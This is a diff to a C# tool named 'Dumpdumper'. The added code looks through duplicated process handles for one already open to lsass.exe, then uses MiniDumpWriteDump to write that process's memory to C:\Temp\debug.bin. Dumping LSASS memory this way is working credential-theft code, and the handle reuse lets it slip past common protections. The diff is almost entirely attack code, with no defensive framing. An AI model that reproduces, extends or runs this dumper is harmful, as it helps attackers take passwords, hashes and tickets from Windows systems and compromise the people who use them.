@@ -1,4 +1,5 @@
 ﻿using System;
+using System.ComponentModel;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
@@ -124,17 +125,17 @@ namespace Dumpdumper
                         allDupedHandles[pid].Add(hDuplicatedHandle);
                     }
 
+                // free handles to our process and duplicated process
                     PInvoke.CloseHandle(hParentProcess);
 
                 }
-            }
-
-            // free handles to our process and duplicated process
+            }            
             PInvoke.CloseHandle(hCurrentProcess);
 
             // go through all duped handles we opened on our process
             // query the object(handle), check if it is a process handle
             // and print the process name
+            var desiredHandle = IntPtr.Zero;
             foreach (var dupedHandle in allDupedHandles)
             {
                 var pid = dupedHandle.Key;
@@ -179,10 +180,33 @@ namespace Dumpdumper
                         var exeName = PInvoke.QueryFullProcessImageName(handle, 0, buffer, out size);
                         processName = buffer.ToString();
                         Console.WriteLine(processName);
-                    }         
+
+                        if (processName.EndsWith("lsass.exe"))
+                        {
+                            Console.WriteLine("Found open handle to Target Process. From PID: {0}", pid);
+                            //Console.WriteLine(processName);
+                            desiredHandle = handle;
+                            break;
+                        }
+                        
+                    }
                 }
             }
-            Console.ReadKey();
+            // Use the found open handle to dump the process memory
+            using var fs = new FileStream(@"C:\Temp\debug.bin", FileMode.Create);
+            if (!PInvoke.MiniDumpWriteDump(desiredHandle, 0, fs.SafeFileHandle, 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero))
+            {
+                var error = new Win32Exception(Marshal.GetLastWin32Error());
+                Console.WriteLine("MiniDumpWriteDump failed. {0}", error.Message);
+                Console.ReadKey();
+            }
+            else
+            {
+                Console.WriteLine("MiniDumpWriteDump successful.");
+                Console.ReadKey();
+                return;
+            }
+            
         }
             
     }
